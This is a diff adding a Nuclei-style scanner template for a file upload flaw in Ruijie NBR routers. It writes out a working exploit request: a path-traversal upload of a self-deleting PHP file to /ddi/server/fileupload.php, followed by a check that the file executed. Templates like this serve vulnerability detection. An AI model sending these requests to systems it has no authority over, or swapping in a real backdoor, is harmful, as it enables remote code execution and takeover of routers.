@@ -1,0 +1,58 @@
+id: ruijie-nbr-fileupload
+info:
+  name: Ruijie NBR Router File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Ruijie NBR routers have a file upload vulnerability allowing attackers to execute arbitrary code, write backdoors, and control the web server.
+  reference:
+    - https://www.ruijie.com.cn
+  tags: fileupload
+
+variables:
+  random_filename: "{{rand_base(16)}}.php"
+  check_string: "{{rand_base(16)}}"
+
+http:
+  - raw:
+      - |
+        POST /ddi/server/fileupload.php?uploadDir=../../ddi&name={{random_filename}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW
+        Content-Disposition: form-data; name="file"; filename="{{random_filename}}"
+        Content-Type: application/x-php
+
+        <?php @error_reporting(0); echo "{{check_string}}"; unlink(__FILE__); ?>
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+    matchers-condition: and
+    stop-at-first-match: true
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "/ddi/{{random_filename}}"
+        group: 0
+        internal: true
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /ddi/{{random_filename}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{check_string}}"
+      - type: status
+        status:
+          - 200
